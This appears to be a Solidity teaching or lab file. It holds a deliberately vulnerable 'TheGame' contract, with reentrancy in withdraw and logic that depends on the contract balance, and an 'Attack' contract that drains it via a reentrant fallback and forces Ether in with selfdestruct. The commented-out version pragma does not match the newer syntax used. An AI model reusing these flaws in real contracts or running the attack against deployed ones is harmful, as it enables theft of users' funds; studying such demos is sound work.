//pragma solidity ^0.4.26;

contract TheGame {
    uint public targetAmount = 10 ether;
    address public winner;
    mapping(address => uint) public playerBalances;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance;
        require(balance <= targetAmount, "Game is over");

        playerBalances[msg.sender] += msg.value;

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function withdraw(uint amount) public {
        require(amount <= playerBalances[msg.sender], "Insufficient funds");
        require(amount == 1 ether, "You can only withdraw 1 Ether");

        uint balance = address(this).balance;
        require(balance < targetAmount, "Game is over");

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to withdraw Ether");

        playerBalances[msg.sender] -= amount;
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        uint reward = address(this).balance;
        (bool sent, ) = msg.sender.call{value: reward}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    TheGame theGame;

    constructor(TheGame _theGame) public {
        theGame = _theGame;
    }

    fallback() external payable {
        if (address(theGame).balance >= 1 ether) {
            theGame.withdraw(1 ether);
        }
    }

    function attack1() public payable {
        address payable addr = payable(address(theGame));
        selfdestruct(addr);
    }

    function attack2() public payable {
        theGame.deposit{value: 1 ether}();
        theGame.withdraw(1 ether);
    }
}

